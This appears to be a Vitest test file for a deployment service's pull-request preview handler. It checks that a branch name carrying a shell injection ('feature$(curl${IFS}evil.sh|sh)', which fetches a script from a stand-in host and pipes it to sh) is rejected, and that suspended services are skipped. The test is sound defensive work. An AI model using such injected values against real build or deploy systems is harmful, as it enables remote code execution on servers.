import { beforeEach, describe, expect, it, vi } from 'vitest';

vi.mock('@/lib/prisma', () => ({
  prisma: {
    project: { findUnique: vi.fn() },
    servicePreview: { upsert: vi.fn(), findUnique: vi.fn(), updateMany: vi.fn() },
    deployment: { create: vi.fn() },
  },
}));

vi.mock('@/services/internal/deploy/server-queue', () => ({
  assertServerCanAcceptQueuedDeployment: vi.fn(),
  scheduleQueuedDeployment: vi.fn(),
  ServerDeployQueueFullError: class extends Error {},
}));

vi.mock('@/services/internal/billing/billing', () => ({
  BillingService: { assertProjectWritable: vi.fn().mockResolvedValue(undefined) },
}));

vi.mock('@/lib/ssh', () => ({
  sshPool: { exec: vi.fn(), execStream: vi.fn(), putContent: vi.fn() },
  sshTargetForServer: vi.fn(),
}));

import { prisma } from '@/lib/prisma';
import { handlePreviewPullRequest } from '@/services/internal/deploy/preview';

type Services = Parameters<typeof handlePreviewPullRequest>[0]['services'];

const service = [
  {
    id: 'svc1',
    name: 'app',
    projectId: 'proj1',
    uuid: 'uuid-1',
    serverId: 'srv1',
    server: { settings: { wildcardDomain: 'preview.peon.sh' } },
  },
] as unknown as Services;

function pullRequest(headBranch: string) {
  return {
    action: 'opened',
    pullRequestId: 7,
    baseBranch: 'main',
    headBranch,
    commitSha: 'abc1234def',
    draft: false,
  };
}

describe('handlePreviewPullRequest head branch validation', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    vi.mocked(prisma.project.findUnique).mockResolvedValue(null as never);
  });

  // The head branch comes from the PR author — on a public repo that is anyone.
  it('skips a PR whose head branch could be expanded by the remote shell', async () => {
    const res = await handlePreviewPullRequest({
      pr: pullRequest('feature$(curl${IFS}evil.sh|sh)'),
      services: service,
    });

    expect(res.deployments).toHaveLength(0);
    expect(res.skipped).toEqual([
      {
        serviceId: 'svc1',
        serviceName: 'app',
        reason: 'PR head branch name contains forbidden characters',
      },
    ]);
    // Rejected before anything is persisted or queued.
    expect(prisma.project.findUnique).not.toHaveBeenCalled();
    expect(prisma.servicePreview.upsert).not.toHaveBeenCalled();
    expect(prisma.deployment.create).not.toHaveBeenCalled();
  });

  // A suspended service is scaled to zero on purpose; a PR must not start
  // containers for it. The push path is guarded separately in the webhook
  // handler, and previews reach the engine through this function instead.
  it('skips a PR for a suspended service before anything is queued', async () => {
    const suspended = [
      { ...(service[0] as object), suspendedAt: new Date('2026-01-01T00:00:00Z') },
    ] as unknown as Services;

    const res = await handlePreviewPullRequest({
      pr: pullRequest('feature/add-thing'),
      services: suspended,
    });

    expect(res.deployments).toHaveLength(0);
    expect(res.skipped).toEqual([
      { serviceId: 'svc1', serviceName: 'app', reason: 'service suspended' },
    ]);
    expect(prisma.servicePreview.upsert).not.toHaveBeenCalled();
    expect(prisma.deployment.create).not.toHaveBeenCalled();
  });

  it('lets an ordinary head branch through the check', async () => {
    const res = await handlePreviewPullRequest({
      pr: pullRequest('feature/add-thing'),
      services: service,
    });

    expect(res.skipped.map((s) => s.reason)).not.toContain(
      'PR head branch name contains forbidden characters',
    );
    expect(prisma.project.findUnique).toHaveBeenCalled();
  });
});
